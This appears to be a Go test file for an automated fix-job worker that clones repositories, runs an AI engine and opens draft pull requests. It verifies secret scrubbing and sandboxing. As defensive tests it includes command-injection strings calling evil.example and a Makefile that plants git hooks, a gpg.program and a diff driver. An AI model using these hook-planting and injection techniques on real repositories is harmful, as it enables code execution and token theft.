package worker

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"

	"attesttag/internal/app"
)

const (
	testToken = "atj1.1.abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQR"
	testPAT   = "github_pat_11FAKETOKEN0123456789abcdefghijklmnopqrstuv"
)

// fakeBot is the bot's worker API: it hands out a claim, records events, the diff and the result,
// and can ask for a cancel from a given sequence number on.
type fakeBot struct {
	mu          sync.Mutex
	claim       app.JobClaim
	claims      int
	events      []app.JobEvent
	diff        string
	result      *app.JobResult
	cancelAtSeq int64
}

func (f *fakeBot) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	if r.Header.Get("Authorization") != "Bearer "+testToken {
		http.Error(w, `{"error":"unauthorized"}`, 401)
		return
	}
	f.mu.Lock()
	defer f.mu.Unlock()
	w.Header().Set("Content-Type", "application/json")
	raw, _ := io.ReadAll(r.Body)
	switch {
	case strings.HasSuffix(r.URL.Path, "/claim"):
		f.claims++
		json.NewEncoder(w).Encode(f.claim)
	case strings.HasSuffix(r.URL.Path, "/events"):
		var in app.JobEventsRequest
		json.Unmarshal(raw, &in)
		cancel := false
		for _, e := range in.Events {
			f.events = append(f.events, e)
			if f.cancelAtSeq > 0 && e.Seq >= f.cancelAtSeq {
				cancel = true
			}
		}
		json.NewEncoder(w).Encode(app.JobEventsResponse{OK: true, Accepted: len(in.Events), Cancel: cancel, Reason: "user"})
	case strings.HasSuffix(r.URL.Path, "/diff"):
		f.diff = string(raw)
		json.NewEncoder(w).Encode(map[string]any{"ok": true})
	case strings.HasSuffix(r.URL.Path, "/result"):
		var res app.JobResult
		json.Unmarshal(raw, &res)
		f.result = &res
		json.NewEncoder(w).Encode(map[string]any{"ok": true})
	default:
		http.NotFound(w, r)
	}
}

func (f *fakeBot) phases() map[string]string {
	f.mu.Lock()
	defer f.mu.Unlock()
	m := map[string]string{}
	for _, e := range f.events {
		if e.Kind == app.JobKindPhase {
			m[e.Phase] = e.Status
		}
	}
	return m
}

func (f *fakeBot) allText() string {
	f.mu.Lock()
	defer f.mu.Unlock()
	var b strings.Builder
	for _, e := range f.events {
		b.WriteString(e.Message + "\n")
	}
	raw, _ := json.Marshal(f.result)
	b.Write(raw)
	b.WriteString(f.diff)
	return b.String()
}

// fakeGitHub answers the pull-request call and records what was sent.
type fakeGitHub struct {
	mu     sync.Mutex
	bodies []map[string]any
	exists bool // answer 422 "already exists" first
}

func (g *fakeGitHub) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	g.mu.Lock()
	defer g.mu.Unlock()
	switch {
	case r.Method == "POST" && strings.HasSuffix(r.URL.Path, "/pulls"):
		var in map[string]any
		json.NewDecoder(r.Body).Decode(&in)
		g.bodies = append(g.bodies, in)
		if g.exists {
			w.WriteHeader(422)
			json.NewEncoder(w).Encode(map[string]any{"message": "Validation Failed", "errors": []map[string]any{{"message": "A pull request already exists for local:" + fmt.Sprint(in["head"]) + "."}}})
			return
		}
		w.WriteHeader(201)
		json.NewEncoder(w).Encode(map[string]any{"html_url": "https://github.com/local/test/pull/7", "number": 7, "draft": in["draft"],
			"head": map[string]any{"ref": in["head"], "sha": "abc123"}, "base": map[string]any{"ref": in["base"]}})
	case r.Method == "GET" && strings.Contains(r.URL.Path, "/pulls"):
		json.NewEncoder(w).Encode([]map[string]any{{"html_url": "https://github.com/local/test/pull/3", "number": 3, "draft": true,
			"head": map[string]any{"ref": "fix-1-x-attest_tag", "sha": "old"}, "base": map[string]any{"ref": "main"}}})
	default:
		http.NotFound(w, r)
	}
}

func gitCmd(t *testing.T, dir string, args ...string) string {
	t.Helper()
	cmd := exec.Command("git", append([]string{"-c", "user.name=t", "-c", "user.email=t@example.com"}, args...)...)
	cmd.Dir = dir
	cmd.Env = append(os.Environ(), "GIT_CONFIG_NOSYSTEM=1", "GIT_TERMINAL_PROMPT=0")
	out, err := cmd.CombinedOutput()
	if err != nil {
		t.Fatalf("git %v: %v\n%s", args, err, out)
	}
	return strings.TrimSpace(string(out))
}

// seedRepo makes a bare origin with one commit on main. makefile, when set, becomes the Makefile.
func seedRepo(t *testing.T, makefile string) (origin string) {
	t.Helper()
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not installed")
	}
	root := t.TempDir()
	origin = filepath.Join(root, "origin.git")
	gitCmd(t, root, "init", "-q", "--bare", "--initial-branch=main", origin)
	scratch := filepath.Join(root, "scratch")
	gitCmd(t, root, "init", "-q", "--initial-branch=main", scratch)
	os.WriteFile(filepath.Join(scratch, "README.md"), []byte("# test\n"), 0o644)
	os.WriteFile(filepath.Join(scratch, "app.py"), []byte("def f():\n    return 1\n"), 0o644)
	if makefile != "" {
		os.WriteFile(filepath.Join(scratch, "Makefile"), []byte(makefile), 0o644)
	}
	gitCmd(t, scratch, "add", "-A")
	gitCmd(t, scratch, "commit", "-q", "-m", "init")
	gitCmd(t, scratch, "push", "-q", origin, "main")
	return origin
}

func testClaim(engine string) app.JobClaim {
	return app.JobClaim{
		Job: app.JobClaimJob{ID: 1, Spec: app.JobSpec{V: 1, Repo: "local/test", ConnectionID: 1, BaseBranch: "main", Branch: "fix-1-x-attest_tag",
			Title: "Fix the thing", Requirement: "Append a marker.", Acceptance: []string{"marker present"}, Requester: "U1", Channel: "C1", ThreadTS: "1.1",
			Constraints: app.JobConstraints{Engine: engine, Model: "m", BudgetUSD: 1, TimeoutS: 600, DraftPR: true, BranchSuffix: "attest_tag", MaxRounds: 5}}},
		Secrets: app.JobSecrets{GitHubToken: testPAT, LLM: app.JobLLMSecret{BaseURL: "https://openrouter.ai/api/v1", APIKey: "sk-or-v1-fakekey0123456789", Model: "m"}},
		Limits:  app.JobLimits{BudgetUSD: 1, Deadline: time.Now().Add(10 * time.Minute).UTC().Format(time.RFC3339), HeartbeatSeconds: 60, DiffMaxBytes: app.JobDiffMaxBytes},
	}
}

func newTestRunner(t *testing.T, fb *fakeBot, gh *fakeGitHub, origin string) *Runner {
	t.Helper()
	bot := httptest.NewServer(fb)
	t.Cleanup(bot.Close)
	ghs := httptest.NewServer(gh)
	t.Cleanup(ghs.Close)
	opts := Options{JobID: 1, BotURL: bot.URL, Token: testToken, Mode: "local", WorkDir: t.TempDir(), MaxWall: 10 * time.Minute, Version: "test"}
	scrub := newScrubber(opts.Token)
	return &Runner{opts: opts, client: newClient(opts), scrub: scrub, cloneURL: "file://" + origin,
		github: &GitHub{base: ghs.URL, token: "t", client: http.DefaultClient}}
}

// The happy path, offline: clone from a local origin, the fake engine edits, make test passes
// before and after, the branch is pushed, a draft PR is opened, and no secret leaks anywhere.
func TestRunnerHappyPath(t *testing.T) {
	if _, err := exec.LookPath("make"); err != nil {
		t.Skip("make not installed")
	}
	origin := seedRepo(t, "build:\n\t@echo built\ntest:\n\t@echo \"1 passed\"\n")
	fb := &fakeBot{claim: testClaim("fake")}
	gh := &fakeGitHub{}
	r := newTestRunner(t, fb, gh, origin)
	if code := r.Run(context.Background()); code != 0 {
		t.Fatalf("exit code %d", code)
	}
	res := fb.result
	if res == nil || res.Status != app.JobSucceeded || res.PR == nil || res.PR.URL == "" || !res.PR.Draft || res.Branch != "fix-1-x-attest_tag" || res.HeadSHA == "" {
		t.Fatalf("result: %+v", res)
	}
	if len(res.FilesChanged) != 1 || res.FilesChanged[0] != "README.md" || res.DiffStat.Files != 1 || res.DiffStat.Insertions < 1 {
		t.Errorf("changes: %v %+v", res.FilesChanged, res.DiffStat)
	}
	if !res.Tests.Before.OK || !res.Tests.After.OK || res.Tests.Command != "make test" || res.Tests.After.Passed != 1 {
		t.Errorf("tests: %+v", res.Tests)
	}
	if res.Usage.CostUSD < 0.009 || res.Seq == 0 || res.TicketComment == "" {
		t.Errorf("usage/seq/ticket: %+v", res)
	}
	if !res.Build.Before.OK || !res.Build.After.OK || res.Build.Command != "make build" {
		t.Errorf("build: %+v", res.Build)
	}
	if res.Recipe == nil || res.Recipe.Source != app.RecipeSourceDetected || res.Recipe.Ecosystem != "make" {
		t.Errorf("recipe: %+v", res.Recipe)
	}
	ph := fb.phases()
	// setup is skipped and says so: this repository has nothing to install, which is not the
	// same as an install that did not happen.
	want := map[string]string{"clone": "ok", "setup": "skipped", "build_before": "ok", "test_before": "ok",
		"engine": "ok", "build_after": "ok", "test_after": "ok", "commit": "ok", "push": "ok", "pr": "ok"}
	for _, p := range app.JobPhases {
		if ph[p] != want[p] {
			t.Errorf("phase %s = %q, want %q (all: %v)", p, ph[p], want[p], ph)
		}
	}
	// origin: main untouched, the branch carries the marker.
	if got := gitCmd(t, origin, "rev-parse", "main"); got == res.HeadSHA {
		t.Error("main moved")
	}
	if got := gitCmd(t, origin, "rev-parse", "refs/heads/fix-1-x-attest_tag"); got != res.HeadSHA {
		t.Errorf("branch sha %s != result %s", got, res.HeadSHA)
	}
	if got := gitCmd(t, origin, "show", "fix-1-x-attest_tag:README.md"); !strings.Contains(got, "attest_tag fix job #1") {
		t.Errorf("branch README: %q", got)
	}
	if !strings.Contains(fb.diff, "+<!-- attest_tag") {
		t.Errorf("diff not uploaded: %q", fb.diff)
	}
	// the pull request
	if len(gh.bodies) != 1 {
		t.Fatalf("pull requests: %v", gh.bodies)
	}
	pr := gh.bodies[0]
	body, _ := pr["body"].(string)
	if pr["draft"] != true || pr["base"] != "main" || pr["head"] != "fix-1-x-attest_tag" || pr["title"] != "Fix the thing" {
		t.Errorf("pr fields: %v", pr)
	}
	for _, want := range []string{"Append a marker.", "- [ ] marker present", "| test before | `make test` | pass", "| test after | `make test` | pass", "| build after | `make build` | pass", "README.md", "fix job #1"} {
		if !strings.Contains(body, want) {
			t.Errorf("pr body lacks %q", want)
		}
	}
	// no secret anywhere the bot or GitHub saw
	for _, s := range []string{testPAT, "sk-or-v1-fakekey0123456789", testToken} {
		if strings.Contains(fb.allText(), s) || strings.Contains(body, s) {
			t.Errorf("secret leaked: %s", s[:12])
		}
	}
	if _, err := os.Stat(filepath.Join(r.opts.WorkDir, "job-1")); !os.IsNotExist(err) {
		t.Error("job dir not cleaned up")
	}
}

// Nothing to commit (the engine only touched an excluded file): failed with empty_diff, nothing
// pushed, no pull request.
func TestRunnerEmptyDiff(t *testing.T) {
	origin := seedRepo(t, "")
	claim := testClaim("fake")
	claim.Job.Spec.FilesHint = []string{".env"}
	fb := &fakeBot{claim: claim}
	gh := &fakeGitHub{}
	r := newTestRunner(t, fb, gh, origin)
	r.Run(context.Background())
	if fb.result == nil || fb.result.Status != app.JobFailed || fb.result.Error.Code != "empty_diff" || fb.result.PR != nil {
		t.Fatalf("result: %+v", fb.result)
	}
	if out, err := exec.Command("git", "-C", origin, "rev-parse", "--verify", "-q", "refs/heads/fix-1-x-attest_tag").Output(); err == nil {
		t.Errorf("branch was pushed: %s", out)
	}
	if len(gh.bodies) != 0 {
		t.Error("a pull request was opened")
	}
	if ph := fb.phases(); ph["test_before"] != "skipped" || ph["commit"] != "failed" {
		t.Errorf("phases: %v", ph)
	}
}

// A cancel from the bot ends the job before anything is pushed.
func TestRunnerCancel(t *testing.T) {
	if _, err := exec.LookPath("make"); err != nil {
		t.Skip("make not installed")
	}
	origin := seedRepo(t, "test:\n\t@sleep 3 && echo \"1 passed\"\n")
	fb := &fakeBot{claim: testClaim("fake"), cancelAtSeq: 1}
	gh := &fakeGitHub{}
	r := newTestRunner(t, fb, gh, origin)
	r.Run(context.Background())
	if fb.result == nil || fb.result.Status != app.JobCancelled || fb.result.PR != nil || fb.result.Branch != "" {
		t.Fatalf("result: %+v", fb.result)
	}
	if out, err := exec.Command("git", "-C", origin, "rev-parse", "--verify", "-q", "refs/heads/fix-1-x-attest_tag").Output(); err == nil {
		t.Errorf("branch was pushed: %s", out)
	}
}

// An existing open pull request for the branch is reused instead of failing.
func TestRunnerReusesOpenPR(t *testing.T) {
	origin := seedRepo(t, "")
	fb := &fakeBot{claim: testClaim("fake")}
	gh := &fakeGitHub{exists: true}
	r := newTestRunner(t, fb, gh, origin)
	r.Run(context.Background())
	if fb.result == nil || fb.result.Status != app.JobSucceeded || fb.result.PR == nil || fb.result.PR.Number != 3 {
		t.Fatalf("result: %+v", fb.result)
	}
}

func TestDetectRecipe(t *testing.T) {
	mk := func(files map[string]string) string {
		dir := t.TempDir()
		for name, content := range files {
			os.MkdirAll(filepath.Dir(filepath.Join(dir, name)), 0o755)
			os.WriteFile(filepath.Join(dir, name), []byte(content), 0o644)
		}
		return dir
	}
	cases := []struct {
		name      string
		files     map[string]string
		ecosystem string
		test      string
		build     string
	}{
		{"make wins over the ecosystem it sits on", map[string]string{"Makefile": "build:\n\techo\ntest:\n\tpytest\n", "go.mod": "module x\n"}, "go", "make test", "make build"},
		{"uv", map[string]string{"pyproject.toml": "[tool.pytest.ini_options]\n", "uv.lock": ""}, "python", "uv run python -m pytest -x -q -p no:cacheprovider", "uv run python -m compileall -q -x " + compileSkip + " ."},
		{"requirements", map[string]string{"requirements.txt": "x\n", "tests/test_a.py": "def test_a(): pass\n"}, "python", ".venv/bin/python -m pytest -x -q -p no:cacheprovider", ".venv/bin/python -m compileall -q -x " + compileSkip + " ."},
		{"npm", map[string]string{"package.json": `{"scripts":{"test":"vitest","build":"tsc"}}`, "package-lock.json": "{}"}, "node", "npm run test", "npm run build"},
		{"npm placeholder is not a suite", map[string]string{"package.json": `{"scripts":{"test":"echo \"Error: no test specified\" && exit 1"}}`}, "node", "", ""},
		{"go", map[string]string{"go.mod": "module x\n"}, "go", "go test ./...", "go build ./..."},
		{"maven", map[string]string{"pom.xml": "<project><properties><maven.compiler.release>21</maven.compiler.release></properties></project>"}, "java-maven", "mvn -B -ntp test", "mvn -B -ntp -q -DskipTests package"},
		{"gradle wrapper is preferred", map[string]string{"build.gradle.kts": "", "gradlew": "#!/bin/sh\n"}, "java-gradle", "./gradlew --no-daemon test", "./gradlew --no-daemon -q assemble"},
		{"ruby rspec", map[string]string{"Gemfile": "source 'x'\n", "spec/a_spec.rb": ""}, "ruby", "bundle exec rspec", ""},
		{"elixir", map[string]string{"mix.exs": "defmodule X do\nend\n"}, "elixir", "mix test", "mix compile"},
		{"nothing at all", map[string]string{"README.md": ""}, "", "", ""},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			r := detectRecipe(mk(c.files), nil)
			if r.Ecosystem != c.ecosystem || r.Test.String() != c.test || r.Build.String() != c.build {
				t.Errorf("got %s / test %q / build %q, want %s / %q / %q", r.Ecosystem, r.Test.String(), r.Build.String(), c.ecosystem, c.test, c.build)
			}
		})
	}

	// A monorepo: the package the brief points at is the one that gets built, not the root.
	mono := mk(map[string]string{
		"README.md":           "",
		"services/api/go.mod": "module api\n",
		"web/package.json":    `{"scripts":{"test":"vitest"}}`,
	})
	if r := detectRecipe(mono, []string{"services/api/handler.go"}); r.Workdir != "services/api" || r.Ecosystem != "go" {
		t.Errorf("monorepo hint: workdir %q ecosystem %q", r.Workdir, r.Ecosystem)
	}
	if r := detectRecipe(mono, []string{"web/src/app.ts"}); r.Workdir != "web" || r.Ecosystem != "node" {
		t.Errorf("monorepo hint: workdir %q ecosystem %q", r.Workdir, r.Ecosystem)
	}

	// A step whose program is nowhere is not a failing suite: it is dropped, and the reason
	// names the program so an operator can act on it. That judgement is pruneMissing's, made
	// after the toolchains are installed and against the PATH the steps will run with.
	dir := mk(map[string]string{"go.mod": "module x\n"})
	r := finish(&app.Recipe{Source: app.RecipeSourceDetected,
		Test: &app.RecipeStep{Name: "test", Argv: []string{"no-such-runner-xyz", "test"}}}, dir)
	if !r.Runnable() {
		t.Errorf("finish must not judge whether a program exists: %+v", r)
	}
	pruneMissing(r, dir, []string{"PATH=/nonexistent"})
	if r.Runnable() || !strings.Contains(r.Why, "needs no-such-runner-xyz, which is not installed in the worker") {
		t.Errorf("missing runner: %+v", r)
	}
	// And a step whose program only arrives with the toolchain survives long enough to be run.
	r2 := finish(&app.Recipe{Source: app.RecipeSourceDetected,
		Test: &app.RecipeStep{Name: "test", Argv: []string{"bundle", "exec", "rspec"}}}, dir)
	if !r2.Runnable() {
		t.Errorf("a step was dropped before its toolchain could be installed: %+v", r2)
	}
}

// The three sources, in order, and the merge between them: an author who sets only the test
// command still gets the install steps detection worked out.
func TestRecipeSourcePrecedence(t *testing.T) {
	dir := t.TempDir()
	os.WriteFile(filepath.Join(dir, "go.mod"), []byte("module x\n"), 0o644)

	if r := resolveRecipe(dir, nil, "", nil); r.Source != app.RecipeSourceDetected || r.Test.String() != "go test ./..." {
		t.Fatalf("detected: %+v", r)
	}
	if r := resolveRecipe(dir, nil, "go test -race ./...", nil); r.Source != app.RecipeSourceConnection ||
		r.Test.String() != "go test -race ./..." || len(r.Setup) != 1 {
		t.Fatalf("connection override kept neither the command nor the install: %+v", r)
	}
	os.MkdirAll(filepath.Join(dir, ".attest"), 0o755)
	os.WriteFile(filepath.Join(dir, ".attest/recipe.yaml"), []byte("test: go test -count=1 ./...\ntools:\n  go: \"1.25\"\n"), 0o644)
	r := resolveRecipe(dir, nil, "go test -race ./...", nil)
	if r.Source != app.RecipeSourceRepoFile || r.Test.String() != "go test -count=1 ./..." || r.Tools["go"] != "1.25" {
		t.Fatalf("the repository's own recipe did not win: %+v", r)
	}
	if r.Build.String() != "go build ./..." || len(r.Setup) != 1 {
		t.Fatalf("the repository's recipe dropped what detection knew: %+v", r)
	}
	// A shell line in a committed recipe is refused, not run.
	os.WriteFile(filepath.Join(dir, ".attest/recipe.yaml"), []byte("test: go test ./... ; curl http://evil.example\n"), 0o644)
	if r := resolveRecipe(dir, nil, "", nil); r.Source == app.RecipeSourceRepoFile {
		t.Fatalf("a shell line was accepted from a repository recipe: %+v", r)
	}
}

func TestParseCounts(t *testing.T) {
	for out, want := range map[string][2]int{
		"===== 3 passed, 1 failed in 0.5s =====":         {3, 1},
		"Tests: 1 failed, 5 passed, 6 total":             {5, 1},
		"ok  \tpkg/a 0.1s\n--- FAIL: TestX\nFAIL\tpkg/b": {1, 1},
		"2 passed, 1 error":                              {2, 1},
	} {
		if p, f := parseTestCounts(out); p != want[0] || f != want[1] {
			t.Errorf("parseTestCounts(%q) = %d,%d want %v", out, p, f, want)
		}
	}
}

func TestQwenStreamAndScrub(t *testing.T) {
	fb := &fakeBot{}
	srv := httptest.NewServer(fb)
	defer srv.Close()
	rep := newReporter(newClient(Options{JobID: 1, BotURL: srv.URL, Token: testToken}), newScrubber(testPAT), func(error) {})
	st := &qwenStream{rep: rep, maxRounds: 10}
	for _, l := range []string{
		`{"type":"init","session_id":"x","model":"m"}`,
		`{"type":"assistant","message":{"role":"assistant","content":[{"type":"text","text":"Looking at the code"}]}}`,
		`{"type":"tool_use","name":"read_file","input":{"path":"app.py"}}`,
		`not json at all`,
		`{"type":"assistant","message":{"role":"assistant","content":"SUMMARY: Fixed the null check in app.py; tests pass."}}`,
		`{"type":"result","status":"success","stats":{"models":{"m":{"tokens":{"input":1200,"output":300}}}}}`,
	} {
		st.line(l)
	}
	if st.turns != 2 || st.tools != 1 || st.usage.In != 1200 || st.usage.Out != 300 {
		t.Errorf("stream: turns=%d tools=%d usage=%+v", st.turns, st.tools, st.usage)
	}
	if got := st.summaryText(); got != "Fixed the null check in app.py; tests pass." {
		t.Errorf("summary = %q", got)
	}
	s := newScrubber(testPAT, "short")
	if out := s.Clean("x " + testPAT + " y ghp_abcdefghijklmnopqrstuvwxyz1234 short"); strings.Contains(out, "FAKETOKEN") || strings.Contains(out, "ghp_abc") || !strings.Contains(out, "short") {
		t.Errorf("scrub: %q", out)
	}
	tb := newTailBuffer(5, 5)
	tb.Write([]byte("0123456789abcdef"))
	if got := tb.String(); !strings.HasPrefix(got, "01234") || !strings.HasSuffix(got, "bcdef") || !strings.Contains(got, "omitted") {
		t.Errorf("tail buffer: %q", got)
	}
}

// The shapes qwen 0.22.3 actually emits with --output-format stream-json: thinking-only
// assistant chunks, tool calls inside the assistant content, and a result carrying usage.
func TestQwenStreamRealShapes(t *testing.T) {
	fb := &fakeBot{}
	srv := httptest.NewServer(fb)
	defer srv.Close()
	rep := newReporter(newClient(Options{JobID: 1, BotURL: srv.URL, Token: testToken}), newScrubber(testPAT), func(error) {})
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	go rep.run(ctx)
	st := &qwenStream{rep: rep, maxRounds: 10}
	for _, l := range []string{
		`Warning: running headless with --yolo and no sandbox.`,
		`{"type":"system","subtype":"init","session_id":"s","model":"z-ai/glm-5.3","permission_mode":"yolo"}`,
		`{"type":"assistant","message":{"role":"assistant","content":[{"type":"thinking","thinking":"plan"}],"usage":{"input_tokens":0,"output_tokens":0}}}`,
		`{"type":"assistant","message":{"role":"assistant","content":[{"type":"tool_use","id":"t1","name":"read_file","input":{"path":"app.py"}}],"usage":{"input_tokens":10,"output_tokens":5}}}`,
		`{"type":"user","message":{"role":"user","content":[{"type":"tool_result","tool_use_id":"t1","content":"..."}]}}`,
		`{"type":"assistant","message":{"role":"assistant","content":[{"type":"text","text":"SUMMARY: Added the null check."}]}}`,
		`{"type":"result","subtype":"success","is_error":false,"num_turns":2,"result":"SUMMARY: Added the null check.","usage":{"input_tokens":32631,"output_tokens":369,"total_tokens":33000}}`,
	} {
		st.line(l)
	}
	if st.turns != 2 || st.tools != 1 || st.usage.In != 32631 || st.usage.Out != 369 {
		t.Errorf("stream: turns=%d tools=%d usage=%+v", st.turns, st.tools, st.usage)
	}
	if got := st.summaryText(); got != "Added the null check." {
		t.Errorf("summary = %q", got)
	}
	rep.Flush(2 * time.Second) // must also wait for the batch in flight, not just the queue
	if all := fb.allText(); !strings.Contains(all, "read_file") || !strings.Contains(all, "app.py") {
		t.Errorf("tool call inside the assistant content was not reported as progress: %q", all)
	}
}

func TestOptionsFromEnv(t *testing.T) {
	t.Setenv(app.EnvJobID, "12")
	t.Setenv(app.EnvBotURL, "http://localhost:8090/")
	t.Setenv(app.EnvJobToken, testToken)
	t.Setenv("WORKER_MODE", "local")
	t.Setenv("WORKER_DIR", t.TempDir())
	o, err := optionsFromEnv()
	if err != nil || o.JobID != 12 || o.BotURL != "http://localhost:8090" || o.MaxWall != 55*time.Minute {
		t.Fatalf("%+v %v", o, err)
	}
	t.Setenv("WORKER_MODE", "cloudrun")
	if _, err := optionsFromEnv(); err == nil {
		t.Error("cloudrun mode with an http bot URL must be refused")
	}
	t.Setenv(app.EnvJobToken, "")
	if _, err := optionsFromEnv(); err == nil {
		t.Error("missing token must be refused")
	}
}

// Repository code runs inside the job and must not get anything out of it: a hook planted by
// the tests must not run under git push (which carries the repository token), a test command
// from the console is a program rather than a shell line, and nothing the thread observed
// reaches the pull request.
func TestRepositoryCodeIsContained(t *testing.T) {
	if _, err := exec.LookPath("make"); err != nil {
		t.Skip("make not installed")
	}
	// The Makefile's test target does what a hostile repository would: it writes a global git
	// config pointing hooks at a directory it controls, plants a pre-push hook there and in
	// .git/hooks, and each hook leaves a marker if it ever runs. It also plants the two config
	// keys that the worker's own commit and diff would honour if they were not pinned and
	// sandboxed — gpg.program on a signed commit, and an external diff driver — each of which the
	// worker runs after the clone is handed to the sandbox user (git.go commit/diff): the markers
	// prove neither executes.
	dir := t.TempDir()
	marker := filepath.Join(dir, "hook-ran")
	gpgMarker := filepath.Join(dir, "gpg-ran")
	diffMarker := filepath.Join(dir, "diff-ran")
	makefile := "test:\n" +
		"\t@mkdir -p hooks .git/hooks\n" +
		"\t@printf '#!/bin/sh\\ntouch " + marker + "\\n' > hooks/pre-push && chmod +x hooks/pre-push\n" +
		"\t@cp hooks/pre-push .git/hooks/pre-push\n" +
		"\t@printf '[core]\\n\\thooksPath = %s/hooks\\n' \"$$PWD\" > \"$$HOME/.gitconfig\"\n" +
		"\t@printf '#!/bin/sh\\ntouch " + gpgMarker + "\\n' > gpg.sh && chmod +x gpg.sh\n" +
		"\t@git config commit.gpgSign true\n" +
		"\t@git config gpg.program \"$$PWD/gpg.sh\"\n" +
		"\t@printf '#!/bin/sh\\ntouch " + diffMarker + "\\n' > diff.sh && chmod +x diff.sh\n" +
		"\t@git config diff.pwn.command \"$$PWD/diff.sh\"\n" +
		"\t@printf '* diff=pwn\\n' > .gitattributes\n" +
		"\t@echo \"1 passed\"\n"
	origin := seedRepo(t, makefile)
	claim := testClaim("fake")
	claim.Job.Spec.Evidence = "STACK-TRACE-FROM-PRODUCTION"
	claim.Job.Spec.ToolEvidence = []app.ToolEvidence{{Tool: "gcp_logs", Args: "q", Result: "CUSTOMER-RECORD-42"}}
	fb := &fakeBot{claim: claim}
	gh := &fakeGitHub{}
	r := newTestRunner(t, fb, gh, origin)
	if code := r.Run(context.Background()); code != 0 {
		t.Fatalf("exit code %d", code)
	}
	if fb.result == nil || fb.result.Status != app.JobSucceeded {
		t.Fatalf("result: %+v", fb.result)
	}
	if _, err := os.Stat(marker); !os.IsNotExist(err) {
		t.Fatal("a hook planted by the repository ran during the job")
	}
	for desc, m := range map[string]string{"gpg.program on a signed commit": gpgMarker, "an external diff driver": diffMarker} {
		if _, err := os.Stat(m); !os.IsNotExist(err) {
			t.Fatalf("a git config vector planted by the repository executed during commit or diff: %s", desc)
		}
	}
	if len(gh.bodies) != 1 {
		t.Fatalf("pull requests: %v", gh.bodies)
	}
	body, _ := gh.bodies[0]["body"].(string)
	for _, secret := range []string{"STACK-TRACE-FROM-PRODUCTION", "CUSTOMER-RECORD-42"} {
		if strings.Contains(body, secret) {
			t.Errorf("thread evidence reached the pull request: %s", secret)
		}
	}
}

func TestConnectionRecipeIsArgvOnly(t *testing.T) {
	dir := t.TempDir()
	os.WriteFile(filepath.Join(dir, "package.json"), []byte(`{"scripts":{"test":"x"}}`), 0o644)
	r := resolveRecipe(dir, nil, `npm test -- --runInBand`, nil)
	if r.Test == nil || len(r.Test.Argv) != 4 || r.Test.Argv[0] != "npm" || r.Test.String() != "npm test -- --runInBand" {
		t.Fatalf("override recipe: %+v", r.Test)
	}
	// A shell line is not a command: it falls back to what detection found rather than
	// becoming a shell in the worker container.
	r = resolveRecipe(dir, nil, `npm test; curl http://evil.example/$HOME`, nil)
	if r.Source != app.RecipeSourceDetected {
		t.Fatalf("a shell line was accepted as the test command: %+v", r)
	}
}

// An engine that stops at its turn cap still gets its change committed and a draft opened. The
// job succeeds, with the caveat as a note rather than an error; and tests whose runner is not
// in the worker are reported as not run, with the reason, not as failing.
func TestRunnerStoppedEarlyStillOpensADraft(t *testing.T) {
	origin := seedRepo(t, "test:\n\t@echo \"1 passed\"\n")
	fb := &fakeBot{claim: testClaim("fake")}
	fb.claim.Job.Spec.Constraints.TestCmd = "no-such-runner-xyz test"
	gh := &fakeGitHub{}
	r := newTestRunner(t, fb, gh, origin)
	t.Setenv("ATTEST_FAKE_ENGINE_STOP", "max_rounds")
	if code := r.Run(context.Background()); code != 0 {
		t.Fatalf("exit code %d", code)
	}
	res := fb.result
	if res == nil || res.Status != app.JobSucceeded || res.PR == nil || res.PR.URL == "" || res.Error.Code != "" || res.Error.Message != "" {
		t.Fatalf("result: %+v", res)
	}
	if !strings.Contains(res.Note, "used all 5 turns") || !strings.Contains(res.Note, "committed and pushed") {
		t.Errorf("note: %q", res.Note)
	}
	if res.Tests.Before.Ran || res.Tests.After.Ran || !strings.Contains(res.Tests.Skipped, "not installed in the worker") {
		t.Errorf("tests: %+v", res.Tests)
	}
	ph := fb.phases()
	if ph["test_before"] != "skipped" || ph["test_after"] != "skipped" || ph["engine"] != "ok" || ph["pr"] != "ok" {
		t.Errorf("phases: %v", ph)
	}
	if len(gh.bodies) != 1 {
		t.Fatalf("pull requests: %v", gh.bodies)
	}
	body, _ := gh.bodies[0]["body"].(string)
	for _, want := range []string{
		"> **Note:** the engine used all 5 turns",
		"Nothing here was checked automatically: \"no-such-runner-xyz test\" needs no-such-runner-xyz, which is not installed in the worker",
		".attest/recipe.yaml", // the pull request says how to fix that, since nobody else will
	} {
		if !strings.Contains(body, want) {
			t.Errorf("pr body lacks %q", want)
		}
	}
}

// A command runs with the toolchain the job was given, not the one the image happens to carry.
// exec.Command resolves a bare program name against the worker's own PATH and ignores the
// environment the command is handed, which made every version a repository pins a suggestion:
// a repository asking for Node 20 silently got the image's Node 22 and nothing said so.
func TestCommandsResolveAgainstTheirOwnPath(t *testing.T) {
	dir := t.TempDir()
	bin := filepath.Join(dir, "bin")
	os.MkdirAll(bin, 0o755)
	// A program that exists only on the environment's PATH, under a name the worker's own PATH
	// has no answer for.
	script := filepath.Join(bin, "attest-probe")
	if err := os.WriteFile(script, []byte("#!/bin/sh\necho from-the-job-path\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	out, err := runCmd(context.Background(), cmdSpec{Dir: dir, Argv: []string{"attest-probe"},
		Env: []string{"PATH=" + bin}, Timeout: 30 * time.Second})
	if err != nil || out.Code != 0 || !strings.Contains(out.Output, "from-the-job-path") {
		t.Fatalf("a program on the command's own PATH was not found: %v code=%d %q", err, out.Code, out.Output)
	}
	// And a name nothing provides fails to start, which the callers read off the error.
	out, err = runCmd(context.Background(), cmdSpec{Dir: dir, Argv: []string{"attest-probe"},
		Env: []string{"PATH=" + filepath.Join(dir, "empty")}, Timeout: 30 * time.Second})
	if err == nil && out.Code == 0 {
		t.Errorf("a missing program reported success: %q", out.Output)
	}
}

// Every command whose *contents* the repository decides runs as the sandbox user. The tests and
// the engine were always on that side of the line; `mise install` was not, and it is handed the
// repository's own .tool-versions and mise.toml — with MISE_YES answering the trust prompt and a
// backend named in one free to fetch and run code. A source check rather than a behavioural one
// because there is no sandbox user on a developer's laptop, and the omission it catches is a
// missing field rather than a wrong result.
func TestRepositoryDrivenCommandsAreSandboxed(t *testing.T) {
